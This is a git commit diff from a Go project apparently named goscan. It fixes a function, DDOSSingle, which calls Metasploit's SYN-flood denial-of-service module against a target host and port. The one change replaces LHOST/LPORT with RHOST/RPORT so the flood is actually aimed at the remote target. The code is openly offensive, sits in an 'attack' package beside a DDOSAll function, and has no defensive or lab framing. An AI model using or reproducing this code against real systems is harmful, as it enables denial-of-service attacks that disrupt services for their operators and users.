40e69e860089e8e556b5a3fa51a20c4d0b9a60e5
cuongtop <cuongtop4598@gmail.com>
2022-04-04 14:40:38 +0700

    fix

--- goscan/core/attack/metasploit.go
+++ goscan/core/attack/metasploit.go
@@ -50,8 +50,8 @@ func DDOSAll(db *gorm.DB, target string) {
 func DDOSSingle(target string, port int, client *gomsf.Client) {
 	utils.Config.Log.LogInfo("Use module auxiliary/dos/tcp/synflood")
 	executeResult, err := client.Module.Execute(gomsf.ExploitType, "auxiliary/dos/tcp/synflood", map[string]interface{}{
-		"LHOST": target,
-		"LPORT": port,
+		"RHOST": target,
+		"RPORT": port,
 	})
 	if err != nil {
 		utils.Config.Log.LogError(err.Error())
